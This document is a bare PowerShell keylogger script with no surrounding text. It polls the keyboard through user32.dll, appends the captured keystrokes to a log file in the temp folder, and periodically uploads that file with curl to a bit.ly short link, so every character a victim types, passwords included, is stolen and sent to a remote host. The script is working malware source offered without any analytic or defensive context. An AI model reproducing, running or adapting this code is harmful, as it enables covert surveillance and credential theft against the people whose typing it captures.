function run-key([Int]$send)
{
  $signatures = @'
        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
        public static extern short GetAsyncKeyState(int virtualKeyCode); 
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int GetKeyboardState(byte[] keystate);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int MapVirtualKey(uint uCode, int uMapType);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
  [Int]$counter = 0
  [Int]$end = 0
  [String]$lista = ""
  try
  {
    while ($end -lt 5) {
      Start-Sleep -Milliseconds 40
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767)
        {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $mychar = New-Object -TypeName System.Text.StringBuilder
          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success)
          {
            # add key to logger file
            $lista += $mychar
            $counter++
            if ($counter -ge 20)
            {
              $counter = 0
              cmd.exe /c "echo $lista>>%temp%\log.dat"
              $lista = ""
              $send++
              if ($send -ge 3)
              {
                $send = 0
                cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3yPnegN"
                cmd.exe /c "echo.>%temp%\log.dat"
              }
            }
            if ($lista.endswith("9"))
            {
              $end++
              if ($end -ge 5)
              {
                break
              }
            }
          }
        }
      }
    }
  }
  finally
  {
    if ($end -lt 5)
    {
      cmd.exe /c "echo $lista>>%temp%\log.dat"
      $lista = ""
      run-key $send
    }
  }
}
run-key 0
